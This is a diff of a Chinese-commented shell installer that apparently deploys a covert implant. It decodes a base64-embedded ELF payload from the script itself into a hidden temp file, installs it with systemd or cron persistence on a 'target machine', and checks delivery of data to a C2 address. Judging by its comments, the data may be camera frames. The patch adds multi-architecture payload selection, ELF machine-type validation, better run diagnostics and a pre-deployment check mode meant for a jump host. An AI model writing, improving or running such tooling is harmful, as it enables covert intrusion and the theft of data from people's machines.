@@ -49,7 +49,7 @@ while [ $# -gt 0 ]; do
         --c2)      C2="$2"; shift 2 ;;
         --key)     KEY="$2"; shift 2 ;;
         --backend) BACKEND="$2"; shift 2 ;;
-        install|uninstall|status) ACTION="$1"; shift ;;
+        install|uninstall|status|checkpayload) ACTION="$1"; shift ;;
         *) printf '未知参数: %s\n' "$1"; exit 2 ;;
     esac
 done
@@ -61,8 +61,39 @@ require_root() {
 }
 
 detect_arch() {
-    # 目标机架构决定用哪份内嵌产物。多架构包由 make_onekey.py 按段区分。
+    # 目标机架构决定用哪份内嵌产物。多架构包由 make_onekey.py 按
+    # "# PAYLOAD_BEGIN <arch>" 分节，extract_bin 按 ARCH_KEY 选节。
     ARCH=$(uname -m 2>/dev/null) || ARCH=unknown
+    case "$ARCH" in
+        x86_64|amd64)         ARCH_KEY=amd64 ;;
+        aarch64|arm64)        ARCH_KEY=arm64 ;;
+        i386|i486|i586|i686)  ARCH_KEY=386 ;;
+        arm|armv5*|armv6*|armv7*|armv8*) ARCH_KEY=arm ;;
+        *)                    ARCH_KEY=unknown ;;
+    esac
+    [ "$ARCH_KEY" = unknown ] && DIE "无法识别的架构: $ARCH（本包不含对应产物）"
+    return 0
+}
+
+arch_machine() {
+    # ELF e_machine 期望值。判据必须是 e_machine 而不是魔数：
+    # 魔数只证明"是个 ELF"，证明不了"是这台机器能跑的 ELF"。
+    case "$1" in
+        amd64) echo 62 ;;   # EM_X86_64
+        arm64) echo 183 ;;  # EM_AARCH64
+        386)   echo 3 ;;    # EM_386
+        arm)   echo 40 ;;   # EM_ARM
+        *)     echo -1 ;;
+    esac
+}
+
+elf_machine() {
+    # 读 ELF 头偏移 18 的 e_machine（2 字节），按 EI_DATA 判端序。
+    _b0=$(od -An -tu1 -j18 -N1 "$1" 2>/dev/null | tr -d ' \n')
+    _b1=$(od -An -tu1 -j19 -N1 "$1" 2>/dev/null | tr -d ' \n')
+    _ei=$(od -An -tu1 -j5  -N1 "$1" 2>/dev/null | tr -d ' \n')
+    case "$_b0$_b1" in ''|*[!0-9]*) echo -1; return 0 ;; esac
+    if [ "$_ei" = "2" ]; then echo $((_b0 * 256 + _b1)); else echo $((_b0 + _b1 * 256)); fi
 }
 
 probe_systemd() {
@@ -135,13 +166,40 @@ validate_c2() {
 # 运行时解码到临时文件，校验 ELF 魔数后才允许安装。
 extract_bin() {
     TMPB=$(mktemp /tmp/.x-XXXXXX 2>/dev/null) || TMPB=/tmp/.x-$$
-    awk '/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f' "$0" \
-        | base64 -d > "$TMPB" 2>/dev/null
+    # 多架构包按 "# PAYLOAD_BEGIN <arch>" 分节，按 ARCH_KEY 选节。
+    #
+    # 【选节不可省——本轮实测复现的缺陷】
+    # 把 e_machine=183(AArch64) 的产物装到 x86_64 上：魔数校验照样通过，
+    # "内嵌产物校验通过（ELF，160392 字节）"、"二进制已安装" 全绿，
+    # 退出码 0、计数"成功 7 失败 0"，而 camd 执行报 "Exec format error"。
+    # systemd 下配合 Restart=always 就是无限重启循环；cron 下是静默不执行。
+    # 部署者看到的是全绿，一帧画面都没有。
+    if grep -q "^# PAYLOAD_BEGIN ${ARCH_KEY}\$" "$0" 2>/dev/null; then
+        # 注意字段位：行是 "# PAYLOAD_BEGIN amd64"，awk 按空白切分后
+        # $1="#", $2="PAYLOAD_BEGIN", $3=架构名。用 $2 会永远选不中，
+        # 表现为"内嵌产物为空或解码失败"——排查时容易误判成 base64 坏了。
+        awk -v want="$ARCH_KEY" '
+            /^# PAYLOAD_BEGIN/ { f = ($3 == want); next }
+            /^# PAYLOAD_END/   { f = 0; next }
+            f { print }
+        ' "$0" | base64 -d > "$TMPB" 2>/dev/null
+    elif grep -q "^# PAYLOAD_BEGIN\$" "$0" 2>/dev/null; then
+        # 单架构包（旧格式，裸标记）。仍做 e_machine 校验，
+        # 否则旧包在错架构机器上一样全绿。
+        awk '/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f' "$0" \
+            | base64 -d > "$TMPB" 2>/dev/null
+    else
+        DIE "本包没有 $ARCH 架构的产物分节（当前架构: $ARCH / $ARCH_KEY）"
+    fi
     [ -s "$TMPB" ] || DIE "内嵌产物为空或解码失败"
-    # ELF 魔数校验：拒绝 stub 脚本。这是本脚本最关键的一道闸。
+    # ELF 魔数校验：拒绝 stub 脚本。
     MAGIC=$(od -An -tx1 -N4 "$TMPB" 2>/dev/null | tr -d ' \n')
     [ "$MAGIC" = "7f454c46" ] || DIE "内嵌产物不是 ELF（魔数=$MAGIC）——拒绝安装 stub"
-    OK "内嵌产物校验通过（ELF，$(wc -c < "$TMPB") 字节）"
+    # e_machine 校验：拒绝错架构产物。
+    MACH=$(elf_machine "$TMPB")
+    WANT=$(arch_machine "$ARCH_KEY")
+    [ "$MACH" = "$WANT" ] || DIE "产物架构不符：分节=$ARCH_KEY 期望 e_machine=$WANT，实际=$MACH（错架构产物会 Exec format error，而安装仍报全绿）"
+    OK "内嵌产物校验通过（ELF/$ARCH_KEY，e_machine=$MACH，$(wc -c < "$TMPB") 字节）"
     return 0
 }
 
@@ -355,6 +413,17 @@ verify_run() {
     N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
     [ -n "$N" ] || N=0
     if [ "$RC" -ne 0 ]; then
+        # 【实测撞出来的误诊】错架构产物的真实报错是 "Exec format error"，
+        # 但旧判据把它一律写成"C2 可能未启动或地址不可达"。运维会据此去查
+        # 网络/防火墙/C2，而真相是二进制根本不能在这台机器上执行。
+        # 判据必须按"不能执行"与"连不上"分开，否则排查方向被彻底带偏。
+        case "$RUN_OUT" in
+            *"Exec format error"*|*"cannot execute"*|*"No such file or directory"*)
+                DIE "二进制无法执行（rc=$RC）——很可能是架构错配，而非 C2 问题: $(printf '%s' "$RUN_OUT" | head -1)" ;;
+        esac
+        if [ "$RC" = 126 ] || [ "$RC" = 127 ]; then
+            DIE "二进制无法执行（rc=$RC）——检查架构与解释器，而非 C2 地址"
+        fi
         WARN "试运行未送达 C2（rc=$RC）——C2 可能未启动或地址不可达；驻留仍在，进程内会重试"
         printf '%s\n' "$RUN_OUT" | sed 's/^/       诊断: /' | head -3
         return 0
@@ -437,16 +506,28 @@ do_status() {
     return 0
 }
 
+do_checkpayload() {
+    # 只校验、不安装：在构建机/跳板上先验"这份包能不能在这台机器上跑"，
+    # 避免在目标机上安装到一半才发现架构错配（那时已留下文件与驻留条目）。
+    detect_arch
+    OK "当前架构: $ARCH -> $ARCH_KEY"
+    extract_bin
+    rm -f "$TMPB" 2>/dev/null
+    OK "分节齐全，e_machine 匹配，可以安装"
+    return 0
+}
+
 case "$ACTION" in
     install)   do_install ;;
     uninstall) do_uninstall ;;
     status)    do_status ;;
+    checkpayload) do_checkpayload ;;
 esac
 report
 [ "$fail" -eq 0 ] || exit 1
 exit 0
 
-# PAYLOAD_BEGIN
+# PAYLOAD_BEGIN amd64
 f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA8DMAAAAAAABAAAAAAAAAAIhqAgAAAAAAAAAAAEAAOAAN
 AEAAIAAfAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
 AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
@@ -3261,4 +3342,4 @@ AAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAUCEC
 AAAAAADQLAAAAAAAAB4AAAClAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAA
 AAAAACBOAgAAAAAAPBsAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAA
 AAAAAAAAAAAAAABcaQIAAAAAACcBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
-# PAYLOAD_END
+# PAYLOAD_END amd64
